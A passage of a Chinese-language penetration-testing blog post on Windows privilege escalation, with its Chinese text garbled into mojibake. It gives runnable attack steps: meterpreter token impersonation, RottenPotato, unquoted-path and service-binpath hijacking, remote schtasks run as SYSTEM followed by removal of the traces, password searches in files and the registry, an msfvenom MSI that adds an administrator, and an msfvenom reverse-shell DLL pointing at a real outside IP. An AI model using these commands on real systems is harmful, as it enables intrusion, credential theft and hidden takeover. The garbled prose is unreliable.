Tokenï¼Œè¿™ä¸ªTokenåœ¨ç”¨æˆ·åˆ›å»ºè¿›ç¨‹æˆ–è€…çº¿ç¨‹æ—¶ä¼šè¢«ä½¿ç”¨ï¼Œä¸æ–­çš„æ‹·è´ï¼Œè¿™ä¹Ÿå°±è§£é‡Šäº†Aç”¨æˆ·åˆ›å»ºä¸€ä¸ªè¿›ç¨‹è€Œè¯¥è¿›ç¨‹æ²¡æœ‰Bç”¨æˆ·çš„æƒé™ã€‚ä¸€èˆ¬ç”¨æˆ·åŒå‡»è¿è¡Œä¸€ä¸ªè¿›ç¨‹éƒ½ä¼šæ‹·è´explorer.exeçš„Access Tokenã€‚è®¿é—®ä»¤ç‰Œåˆ†ä¸ºï¼š</p><p>* æˆæƒä»¤ç‰Œï¼ˆDelegation tokenï¼‰ï¼šäº¤äº’å¼ä¼šè¯ç™»é™†ï¼ˆä¾‹ï¼šæœ¬åœ°ç”¨æˆ·ç™»é™†ã€ç”¨æˆ·æ¡Œé¢ç­‰ï¼‰</p><p>* æ¨¡æ‹Ÿä»¤ç‰Œï¼ˆImpersonation tokenï¼‰ï¼šéäº¤äº’å¼ç™»é™†ï¼ˆä¾‹ï¼šnet use è®¿é—®å…±äº«æ–‡ä»¶ï¼‰</p><p>ä¸¤ç§tokenåªæœ‰åœ¨ç³»ç»Ÿé‡å¯åæ‰ä¼šæ¸…é™¤ï¼›æˆæƒä»¤ç‰Œåœ¨ç”¨æˆ·æ³¨é”€åï¼Œè¯¥ä»¤ç‰Œä¼šå˜ä¸ºæ¨¡æ‹Ÿä»¤ç‰Œä¾æ—§æœ‰æ•ˆã€‚</p><p>åŒæ ·ä¹Ÿå¯ä»¥è¿™æ ·ç†è§£ï¼Œ<strong>å½“å‰ç³»ç»Ÿä¸­çš„æŸä¸ªè¿›ç¨‹æˆ–çº¿ç¨‹èƒ½è®¿é—®åˆ°ä»€ä¹ˆæ ·çš„ç³»ç»Ÿèµ„æº,å®Œå…¨å–å†³äºä½ å½“å‰è¿›ç¨‹æ˜¯æ‹¿ç€è°çš„ä»¤ç‰Œã€‚</strong></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åˆ—ä¸¾ä»¤ç‰Œï¼Œåªèƒ½åˆ—ä¸¾å‡ºå½“å‰ç”¨æˆ·å’Œæ¯”å½“å‰ç”¨æˆ·æƒé™æ›´ä½ç”¨æˆ·çš„ä»¤ç‰Œã€‚ä»¤ç‰Œçš„æ•°é‡å–å†³äºå½“å‰shellçš„è®¿é—®çº§åˆ«ï¼Œå¦‚æœå½“å‰çš„æƒé™æ˜¯ä¸€ä¸ªæ™®é€šåŸŸç”¨æˆ·ï¼Œæ‰€ä»¥ä»¤ç‰Œçªƒå–åªèƒ½çªƒå–åˆ°å½“å‰ç”¨æˆ·æœ¬èº«æ˜¯ã€‚å¦‚æœå½“å‰çš„shellæ˜¯administratoræˆ–è€…æ˜¯systemï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°ç³»ç»Ÿä¸­çš„æ‰€æœ‰çš„ä»¤ç‰Œã€‚</p><p><strong>æ”»å‡»æ–¹æ³•</strong></p><p><strong>ç¬¬ä¸€ç§é¦–å…ˆæå‰è·å–ä¸€ä¸ªsession</strong></p><pre><code class="text">meterpreter &gt; use incognitometerpreter &gt; list_tokens -umeterpreter &gt; impersonate_token WIN-2HU3N1\\Administrator #æ³¨æ„ï¼šè¿™é‡Œæ˜¯ä¸¤ä¸ªåæ–œæ \\</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220313002103573.png" alt="image-20220313002103573"></p><p><strong>ç¬¬äºŒç§å€Ÿç”¨Rotten potatoç¨‹åº</strong></p><p>é“¾æ¥:<a href="https://github.com/foxglovesec/RottenPotato.git">https://github.com/foxglovesec/RottenPotato.git</a></p><pre><code class="text">meterpreter &gt; use incognitometerpreter &gt; list_tokens -uWIN-2HU3N1\Administratormeterpreter &gt; upload /root/Rottenpotato/rottenpotato.exeSuccessfullymeterpreter &gt; execute -HC -f rottenpotato.exeSuccessfullymeterpreter &gt; getuid...NT AUTHORITY\SYSTEM</code></pre><h2 id="çƒ‚åœŸè±†ææƒ-MS16-075"><a href="#çƒ‚åœŸè±†ææƒ-MS16-075" class="headerlink" title="çƒ‚åœŸè±†ææƒ-MS16-075"></a><strong>çƒ‚åœŸè±†ææƒ-MS16-075</strong></h2><p><strong>ä¸€èˆ¬çƒ‚åœŸè±†éœ€è¦æ¥é…åˆä»¤ç‰Œçªƒå–æ¥è¿›è¡Œææƒ</strong></p><p><strong>æ³¨æ„ï¼ˆé‡ç‚¹ï¼šç”¨çƒ‚åœŸè±†é…åˆæœ¬åœ°ç”¨æˆ·ææƒæ˜¯æˆåŠŸä¸äº†çš„ï¼Œå¿…é¡»æ˜¯webæƒé™æˆ–æ•°æ®åº“æƒé™ï¼‰</strong></p><ol><li>å•çº¯ä»¤ç‰Œçªƒå–ï¼šWebæƒé™æˆ–æœ¬åœ°æƒé™</li><li>é…åˆçƒ‚åœŸè±†ææƒï¼šwebæƒé™æˆ–æ•°æ®åº“ç­‰æƒé™</li></ol><p><strong>çƒ‚åœŸè±†ææƒåŸç†</strong></p><ol><li>æ¬ºéª— â€œNT AUTHORITY\SYSTEMâ€è´¦æˆ·é€šè¿‡NTLMè®¤è¯åˆ°æˆ‘ä»¬æ§åˆ¶çš„TCPç»ˆç«¯ã€‚</li><li>å¯¹è¿™ä¸ªè®¤è¯è¿‡ç¨‹ä½¿ç”¨ä¸­é—´äººæ”»å‡»ï¼ˆNTLMé‡æ”¾ï¼‰ï¼Œä¸ºâ€NT AUTHORITY\SYSTEMâ€è´¦æˆ·æœ¬åœ°åå•†ä¸€ä¸ªå®‰å…¨ä»¤ç‰Œã€‚è¿™ä¸ªè¿‡ç¨‹æ˜¯é€šè¿‡ä¸€ç³»åˆ—çš„Windows APIè°ƒç”¨å®ç°çš„ã€‚</li><li>æ¨¡ä»¿è¿™ä¸ªä»¤ç‰Œã€‚åªæœ‰å…·æœ‰â€æ¨¡ä»¿å®‰å…¨ä»¤ç‰Œæƒé™â€çš„è´¦æˆ·æ‰èƒ½å»æ¨¡ä»¿åˆ«äººçš„ä»¤ç‰Œã€‚ä¸€èˆ¬å¤§å¤šæ•°çš„æœåŠ¡å‹è´¦æˆ·ï¼ˆIISã€MSSQLç­‰ï¼‰æœ‰è¿™ä¸ªæƒé™ï¼Œå¤§å¤šæ•°ç”¨æˆ·çº§çš„è´¦æˆ·æ²¡æœ‰è¿™ä¸ªæƒé™ã€‚</li></ol><p>æ‰€ä»¥ï¼Œä¸€èˆ¬ä»webæ‹¿åˆ°çš„webshelléƒ½æ˜¯IISæœåŠ¡å™¨æƒé™ï¼Œæ˜¯å…·æœ‰è¿™ä¸ªæ¨¡ä»¿æƒé™çš„ã€‚æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæˆ‘å‘ç°ä½¿ç”¨å·²ç»å»ºå¥½çš„è´¦æˆ·ï¼ˆå°±æ˜¯ä¸Šé¢è¯´çš„ç”¨æˆ·çº§è´¦æˆ·ï¼‰å»åå¼¹meterpreterç„¶åå†å»æ‰§è¡ŒEXPçš„æ—¶å€™ä¼šå¤±è´¥ï¼Œä½†ä½¿ç”¨èœåˆ€ï¼ˆIISæœåŠ¡å™¨æƒé™ï¼‰åå¼¹meterpreterå°±ä¼šæˆåŠŸã€‚</p><p><strong>æ”»å‡»æ–¹æ³•</strong></p><pre><code class="text">meterpreter &gt; upload /root/Rottenpotato/rottenpotato.exemeterpreter &gt; execute -HC -f rottenpotato.exemeterpreter &gt; use incognitometerpreter &gt; list_tokens -u</code></pre><p>ä¼šå‘ç°ä»¤ç‰Œåˆ—è¡¨é‡Œé¢å­˜åœ¨systemçš„ä»¤ç‰Œï¼Œåœ¨ç”¨systemçš„ä»¤ç‰Œè¿›è¡Œææƒ</p><p>Juicy Potatoçš„é™åˆ¶æ¡ä»¶å¦‚ä¸‹ï¼š</p><p>1ã€éœ€è¦æ”¯æŒSeImpersonateæˆ–è€…SeAssignPrimaryTokenæƒé™<br>2ã€å¼€å¯DCOM<br>3ã€æœ¬åœ°æ”¯æŒRPCæˆ–è€…è¿œç¨‹æœåŠ¡å™¨æ”¯æŒPRCå¹¶èƒ½æˆåŠŸç™»å½•<br>4ã€èƒ½å¤Ÿæ‰¾åˆ°å¯ç”¨çš„COMå¯¹è±¡</p><p>ä¸€èˆ¬ä»webæ‹¿åˆ°çš„webshelléƒ½æ˜¯IISæœåŠ¡å™¨æƒé™ï¼Œæ˜¯å…·æœ‰è¿™ä¸ªæ¨¡ä»¿æƒé™çš„ã€‚ä¸€èˆ¬å¤§å¤šæ•°çš„æœåŠ¡å‹è´¦æˆ·IISã€MSSQLç­‰ï¼Œæœ‰è¿™ä¸ªæƒé™ï¼Œå¤§å¤šæ•°ç”¨æˆ·çº§çš„è´¦æˆ·æ²¡æœ‰è¿™ä¸ªæƒé™ï¼Œè¿™äº›éƒ½å¯ä»¥whoami /priv è¯•ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰æ¨¡ä»¿æƒé™ã€‚</p><p><strong>çƒ‚åœŸè±†ç‰ˆæœ¬</strong></p><p>RottonPatatoè„šæœ¬ï¼š</p><ol><li><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</a></li><li><a href="https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe</a></li><li><a href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></li></ol><h2 id="å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´"><a href="#å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´" class="headerlink" title="å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´"></a><strong>å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´</strong></h2><p><strong>å¦‚æœä¸€ä¸ªæœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„æ²¡æœ‰è¢«åŒå¼•å·å¼•èµ·æ¥ä¸”åŒ…å«ç©ºæ ¼ï¼Œé‚£ä¹ˆè¿™ä¸ªæœåŠ¡å°±æ˜¯æœ‰æ¼æ´çš„</strong></p><h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>è¿™é‡Œå‡è®¾æœ‰ä¸€ä¸ªæœåŠ¡è·¯å¾„ C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe</p><ol><li>å¸¦å¼•å·æ—¶ï¼šâ€C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exeâ€ä¼šè¢«çœ‹æˆä¸€ä¸ªå®Œæ•´çš„æœåŠ¡è·¯å¾„ï¼Œæ•…ä¸ä¼šäº§ç”Ÿæ¼æ´ã€‚</li><li>ä¸å¸¦å¼•å·æ—¶ï¼šæˆ‘ä»¬è®¤ä¸ºçš„æœåŠ¡è·¯å¾„æ˜¯C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exeï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰åŒå¼•å·çš„åŒ…è£¹ï¼ŒWindowsä¼šè®¤ä¸ºC:\Programç©ºæ ¼åé¢çš„ä¸ºProgramè¿™ä¸ªç¨‹åºçš„å‚æ•°æ¥è¿›è¡Œå¯åŠ¨æœåŠ¡ã€‚è¿™æ ·æ”»å‡»è€…å°±å¯ä»¥å‘½åä¸€ä¸ªä¸ºProgram.exeçš„åé—¨æ–‡ä»¶æ”¾åœ¨cç›˜ä¸‹ï¼Œè¿›è€Œç­‰å¾…å«æ¼æ´æœåŠ¡è·¯å¾„çš„å¯åŠ¨æˆ–é‡å¯å¯¼è‡´åé—¨æ–‡ä»¶çš„æ‰§è¡Œã€‚</li></ol><h3 id="æ”»å‡»æ–¹æ³•"><a href="#æ”»å‡»æ–¹æ³•" class="headerlink" title="æ”»å‡»æ–¹æ³•"></a>æ”»å‡»æ–¹æ³•</h3><p>å¯»æ‰¾å­˜åœ¨æ¼æ´çš„æœåŠ¡</p><pre><code class="text">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165349775-559246082.png" alt="img"></p><p>æŠŠæˆ‘ä»¬åé—¨æ–‡ä»¶é‡å‘½åæ”¾åœ¨å¯¹åº”çš„æ–‡ä»¶è·¯å¾„ä¸‹</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350108-1640161384.png" alt="img"></p><p>  åœ¨msfä¸Šè¿›è¡Œç›‘å¬ï¼Œç„¶åå¯åŠ¨å¯¹åº”æœåŠ¡</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350469-809846620.png" alt="img"></p><p>æ¥æ”¶åˆ°shellï¼Œä¸”æ˜¯systemæƒé™</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350841-1807683012.png" alt="img"></p><pre><code class="text">#msfæ£€æµ‹æ”»å‡»æ¨¡å—exploit/windows/local/unquoted_service_path#æ­£å¸¸æ¥æ”¶åˆ°ä¼šè¯åï¼Œä¸ä¹…å°±ä¼šè‡ªåŠ¨æ–­å¼€è¿æ¥ï¼Œéœ€è¦å¼€å¯å‘½ä»¤è‡ªåŠ¨è¿ç§»è¿›ç¨‹set AutoRunScript migrate -f</code></pre><pre><code class="text">#æ‰‹åŠ¨æ”»å‡»æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„exeæ ¹æ®éœ€è¦é‡å‘½åå¹¶æ”¾ç½®åœ¨å¯å†™å…¥çš„æœ‰æ¼æ´ç›®å½•ä¸‹ç„¶åé‡å¯æœåŠ¡sc stop service_namesc start service_name</code></pre><h2 id="ä¸å®‰å…¨æœåŠ¡æƒé™é…åˆè®¡åˆ’ä»»åŠ¡schtasksæˆ–SCå‘½ä»¤åˆ©ç”¨"><a href="#ä¸å®‰å…¨æœåŠ¡æƒé™é…åˆè®¡åˆ’ä»»åŠ¡schtasksæˆ–SCå‘½ä»¤åˆ©ç”¨" class="headerlink" title="ä¸å®‰å…¨æœåŠ¡æƒé™é…åˆè®¡åˆ’ä»»åŠ¡schtasksæˆ–SCå‘½ä»¤åˆ©ç”¨"></a><strong>ä¸å®‰å…¨æœåŠ¡æƒé™é…åˆè®¡åˆ’ä»»åŠ¡schtasksæˆ–SCå‘½ä»¤åˆ©ç”¨</strong></h2><p>å¦‚æœæ”»å‡»è€…å¯¹ä»¥é«˜æƒé™è¿è¡Œçš„ä»»åŠ¡æ‰€åœ¨çš„ç›®å½•å…·æœ‰å†™æƒé™ï¼Œå°±å¯ä»¥ä½¿ç”¨è¦†ç›–åŸæ¥çš„æœåŠ¡è·¯å¾„ï¼Œè¿›è€Œå¯åŠ¨æˆ‘ä»¬çš„æ¶æ„ç¨‹åºã€‚ï¼ˆä¸€èˆ¬ç”¨æ¥administratorææƒåˆ°systemï¼Œå› ä¸ºæ™®é€šç”¨æˆ·ç”¨scä¿®æ”¹æœåŠ¡è·¯å¾„ä¼šæ²¡æœ‰æƒé™ï¼Œå¯¼è‡´ä¸èƒ½ç”¨è¯¥æ–¹æ³•ææƒã€‚ï¼‰</p><p>accesschk.exe -uwcqv â€œadministratorsâ€ * #æ£€æŸ¥administratorsç»„çš„æƒé™é…ç½®ï¼ˆè¿™é‡Œè‡ªå·±åˆ›å»ºäº†ä¸€ä¸ªtestæœåŠ¡ï¼‰</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351169-1682951443.png" alt="img"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351505-495496718.png" alt="img"></p><p>sc config â€œtestâ€ binpath=â€C:\shell.exeâ€ #ç”¨scå‘½ä»¤ä¿®æ”¹æœåŠ¡å¯¹åº”è·¯å¾„</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351871-824825594.png" alt="img"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352226-1488097995.png" alt="img"></p><p>sc start test #ç„¶åæˆ‘ä»¬åœ¨msfç›‘å¬ï¼Œåœ¨å¯åŠ¨è¯¥æœåŠ¡ï¼Œå°±å¯ä»¥æ¥æ”¶åˆ°æˆ‘ä»¬çš„shell</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352599-1121177084.png" alt="img"></p><p>å½“ç„¶è¿˜å¯ä»¥ç”¨schtasksæ¥å®šæ—¶å¯åŠ¨æœåŠ¡ï¼Œschtaskså‘½ä»¤æ¯”atå‘½ä»¤æ›´çµæ´»ã€‚è€Œä¸”åœ¨Windows Vistaã€Windows Server 2008åŠä¹‹åç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿå·²ç»å¼ƒç”¨atå‘½ä»¤ã€‚</p><p>#æŸ¥çœ‹è®¡ç®—æœºçš„è®¡åˆ’ä»»åŠ¡<br>schtasks /query /fo LIST /v</p><p>schtasks /create /s 10.10.10.80 /tn test /sc onstart /tr c:\artifact.exe /ru system /f</p><p>åœ¨è¿œç¨‹ä¸»æœºè¿è¡Œâ€testâ€ä»»åŠ¡</p><p>schtasks /run /s 10.10.10.80 /i /tn â€œtestâ€</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352923-1541900357.png" alt="img"></p><p> æ‰§è¡Œå®Œæˆä¹‹åå°±åˆ é™¤è®¡åˆ’ä»»åŠ¡</p><p>schtasks /delete /s 10.10.10.80 /tn â€œtestâ€ /f</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353205-57489983.png" alt="img"></p><p> æ¥ç€åˆ é™¤IPC$</p><p>net use \10.10.10.80 /del /y</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353471-1410299606.png" alt="img"></p><p> åœ¨ä½¿ç”¨schtaskså‘½ä»¤çš„æ—¶å€™ä¼šåœ¨ç³»ç»Ÿç•™ä¸‹æ—¥å¿—æ–‡ä»¶C:WindowsTasksSchedLgU.txtã€‚</p><p><strong>å‚æ•°çš„æ„æ€ï¼š</strong></p><p>/create è¡¨ç¤ºåˆ›å»ºè®¡åˆ’ä»»åŠ¡</p><p>/tn è¡¨ç¤ºä»»åŠ¡å</p><p>/tr æŒ‡å®šè¿è¡Œçš„æ–‡ä»¶</p><p>/sc æ˜¯ä»»åŠ¡è¿è¡Œé¢‘ç‡</p><p>/st æ˜¯æ‰§è¡Œæ—¶é—´</p><p>/s æŒ‡å®šè¿œç¨‹æœºå™¨åæˆ– ip åœ°å€</p><p>/ru æŒ‡å®šè¿è¡Œä»»åŠ¡çš„ç”¨æˆ·æƒé™ï¼Œè¿™é‡ŒæŒ‡å®šä¸ºæœ€é«˜çš„ SYSTEM</p><p>/i è¡¨ç¤ºç«‹å³è¿è¡Œ</p><p>/F è¡¨ç¤ºå¦‚æœæŒ‡å®šçš„ä»»åŠ¡å·²ç»å­˜åœ¨ï¼Œåˆ™å¼ºåˆ¶åˆ›å»ºä»»åŠ¡å¹¶æŠ‘åˆ¶è­¦å‘Š</p><p>/delete æ˜¯åˆ é™¤ä»»åŠ¡ã€‚</p><h2 id="Unattended-Installsï¼ˆè‡ªåŠ¨å®‰è£…ï¼‰"><a href="#Unattended-Installsï¼ˆè‡ªåŠ¨å®‰è£…ï¼‰" class="headerlink" title="Unattended Installsï¼ˆè‡ªåŠ¨å®‰è£…ï¼‰"></a><strong>Unattended Installsï¼ˆè‡ªåŠ¨å®‰è£…ï¼‰</strong></h2><p>è‡ªåŠ¨å®‰è£…å…è®¸ç¨‹åºåœ¨ä¸éœ€è¦ç®¡ç†å‘˜å…³æ³¨ä¸‹è‡ªåŠ¨å®‰è£…ã€‚è¿™ç§è§£å†³æ–¹æ¡ˆç”¨äºåœ¨æ‹¥æœ‰è¾ƒå¤šé›‡å‘˜å’Œæ—¶é—´ç´§ç¼ºçš„è¾ƒå¤§ å‹ç»„ç»‡ä¸­éƒ¨ç½²ç¨‹åºã€‚å¦‚æœç®¡ç†å‘˜æ²¡æœ‰è¿›è¡Œæ¸…ç†çš„è¯ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸€ä¸ªåä¸ºUnattendçš„XMLæ–‡ä»¶æ®‹å­˜åœ¨ç³»ç»Ÿä¸Šã€‚ è¿™ä¸ªXMLæ–‡ä»¶åŒ…å«æ‰€æœ‰åœ¨å®‰è£…ç¨‹åºè¿‡ç¨‹ä¸­çš„é…ç½®ï¼ŒåŒ…æ‹¬ä¸€äº›æœ¬åœ°ç”¨æˆ·çš„é…ç½®ï¼Œä»¥åŠç®¡ç†å‘˜è´¦æˆ·ã€‚</p><p>å…¨ç›˜æœç´¢Unattendæ–‡ä»¶æ˜¯ä¸ªå¥½åŠæ³•ï¼Œå®ƒé€šå¸¸ä¼šåœ¨ä»¥ä¸‹ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼š</p><pre><code class="text">C:\Windows\Panther\C:\Windows\Panther\Unattend\C:\Windows\System32\C:\Windows\System32\sysprep\</code></pre><p>é™¤äº†Unattend.xmlæ–‡ä»¶å¤–ï¼Œè¿˜è¦ç•™æ„ç³»ç»Ÿä¸­çš„sysprep.xmlå’Œsysprep.infæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä¸­éƒ½ä¼šåŒ…å«éƒ¨ç½²æ“ä½œ ç³»ç»Ÿæ—¶ä½¿ç”¨çš„å‡­æ®ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å¯ä»¥å¸®åŠ©æˆ‘ä»¬ææƒã€‚</p><pre><code class="text">C:\Users\user\Desktop&gt; dir C:*vnc.ini /s /b /c</code></pre><p>æˆ–è€…åœ¨åç§°ä¸­åŒ…å«å…³é”®è¯çš„é¡¹ç›®ï¼š</p><pre><code class="text">C:\Users\user\Desktop&gt; dir C:\ /s /b /c | findstr /sr *password*</code></pre><p>æˆ–è€…å¯ä»¥åœ¨æ–‡ä»¶å†…å®¹ä¸­æœç´¢passwordä¹‹ç±»çš„å…³é”®å­—ï¼š</p><pre><code class="text">C:\Users\user\Desktop&gt;findstr /si password *.txt | *.xml | *.ini</code></pre><p>å¯ä»¥æŸ¥è¯¢æ³¨å†Œè¡¨ï¼Œä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²passwordï¼š</p><pre><code class="text">reg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s</code></pre><p>åœ¨è¿™äº›æ–‡ä»¶ä¸­é€šå¸¸åŒ…å«ç”¨æˆ·åå’Œå¯†ç ï¼Œå¯†ç ä½¿ç”¨base64ç¼–ç ï¼Œå¹¶ä¸”åœ¨æœ€åä¼šé™„åŠ â€Passwordâ€ï¼Œæ‰€ä»¥çœŸæ­£çš„å¯† ç éœ€è¦å»æ‰æœ€åçš„â€Passwordâ€ã€‚</p><p><strong>msfæ¨¡å—</strong>:</p><pre><code class="text">post/windows/gather/enum_unattend</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353799-254963719.png" alt="img"></p><h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a><strong>AlwaysInstallElevated</strong></h2><p>AlwaysInstallElevated æ˜¯ä¸€ç§å…è®¸éç®¡ç†ç”¨æˆ·ä»¥SYSTEMæƒé™è¿è¡ŒMicrosoft Windowså®‰è£…ç¨‹åºåŒ…ï¼ˆ.MSIæ–‡ä»¶ï¼‰çš„è®¾ç½®ã€‚é»˜è®¤æƒ…å†µä¸‹ç¦ç”¨æ­¤è®¾ç½®ï¼Œéœ€ç³»ç»Ÿç®¡ç†å‘˜æ‰‹åŠ¨å¯ç”¨ä»–ã€‚</p><p>å¯ä»¥é€šè¿‡æŸ¥è¯¢ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹æ¥è¯†åˆ«æ­¤è®¾ç½®ï¼š</p><pre><code class="text">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer] &quot;AlwaysInstallElevated&quot;=dword:00000001[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] &quot;AlwaysInstallElevated&quot;=dword:00000001</code></pre><p>ä½¿ç”¨reg queryå‘½ä»¤æŸ¥è¯¢æ˜¯å¦å­˜åœ¨æ¼æ´:</p><pre><code class="text">C:&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedorC:&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre><p>å¦‚æœç³»ç»Ÿæ²¡è¿™ä¸ªæ¼æ´ï¼Œå®ƒå°†è¾“å‡ºé”™è¯¯:</p><pre><code class="text">ERROR: The system was unable to find the specified registry key or value.</code></pre><p>å¦‚æœå­˜åœ¨æ¼æ´ï¼Œä¸Šé¢å°†è¾“å‡ºä»¥ä¸‹å†…å®¹:</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165354233-1421529420.png" alt="img"></p><p>ç„¶åæˆ‘ä»¬ä½¿ç”¨msfvenomç”Ÿæˆmsiæ–‡ä»¶ï¼Œè¿›è¡Œææƒ</p><pre><code class="text">msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msimsiexec /quiet /qn /i C:\programdata\rotten.msi# /quiet å®‰è£…è¿‡ç¨‹ä¸­ç¦æ­¢å‘ç”¨æˆ·å‘é€æ¶ˆæ¯# /qn ä¸ä½¿ç”¨GUI# /i å®‰è£…ç¨‹åº</code></pre><p>msfä¸‹çš„è‡ªåŠ¨æ¨¡å—<br>exploit/windows/local/always_install_elevated</p><h2 id="DLLåŠ«æŒææƒ"><a href="#DLLåŠ«æŒææƒ" class="headerlink" title="DLLåŠ«æŒææƒ"></a><strong>DLLåŠ«æŒææƒ</strong></h2><p><strong>åŸç†</strong>ï¼šWindowsç¨‹åºå¯åŠ¨çš„æ—¶å€™éœ€è¦DLLã€‚å¦‚æœè¿™äº›DLL ä¸å­˜åœ¨ï¼Œåˆ™å¯ä»¥é€šè¿‡åœ¨åº”ç”¨ç¨‹åºè¦æŸ¥æ‰¾çš„ä½ç½®æ”¾ç½®æ¶æ„DLLæ¥ææƒã€‚é€šå¸¸ï¼ŒWindowsåº”ç”¨ç¨‹åºæœ‰å…¶é¢„å®šä¹‰å¥½çš„æœç´¢DLLçš„è·¯å¾„ï¼Œå®ƒä¼šæ ¹æ®ä¸‹é¢çš„é¡ºåºè¿›è¡Œæœç´¢ï¼š</p><p>1ã€åº”ç”¨ç¨‹åºåŠ è½½çš„ç›®å½•</p><p>2ã€C:\Windows\System32</p><p>3ã€C:\Windows\System</p><p>4ã€C:\Windows</p><p>5ã€å½“å‰å·¥ä½œç›®å½•Current Working Directoryï¼ŒCWD</p><p>6ã€åœ¨PATHç¯å¢ƒå˜é‡çš„ç›®å½•ï¼ˆå…ˆç³»ç»Ÿåç”¨æˆ·ï¼‰</p><p>è¿‡ç¨‹ï¼šä¿¡æ¯æ”¶é›†-è¿›ç¨‹è°ƒè¯•-åˆ¶ä½œdllå¹¶ä¸Šä¼ -æ›¿æ¢dll-å¯åŠ¨åº”ç”¨åæˆåŠŸ</p><p>msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.169.46 lport=6677 -f dll &gt;/opt/test.dll</p><h2 id="å¸¸ç”¨ç³»ç»Ÿæ¼æ´CVE"><a href="#å¸¸ç”¨ç³»ç»Ÿæ¼æ´CVE" class="headerlink" title="å¸¸ç”¨ç³»ç»Ÿæ¼æ´CVE"></a><strong>å¸¸ç”¨ç³»ç»Ÿæ¼æ´CVE</strong></h2><p>#Windows10</p><p>CVE-2020-0796 <a href="https://www.cnblogs.com/-chenxs/p/12618678.html">https://www.cnblogs.com/-chenxs/p/12618678.html</a></p><p>#Windows7/2008</p><p>CVE-2018-8120 <a href="https://www.cnblogs.com/-mo-/p/11404598.html">https://www.cnblogs.com/-mo-/p/11404598.html</a></p><p>#Windows7/8ã€2008/2012/2016</p><p>CVE-2017-0213 <a href="https://www.cnblogs.com/-mo-/p/11446144.html">https://www.cnblogs.com/-mo-/p/11446144.html</a></p><p>#SQL Serverã€IISé€šæ€ (é’ˆå¯¹æœ¬åœ°ç”¨æˆ·çš„ï¼Œä¸èƒ½ç”¨äºåŸŸç”¨æˆ·)</p><p>MS16-075(RottenPotato) <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p><h1 id="æ•°æ®åº“ææƒ"><a 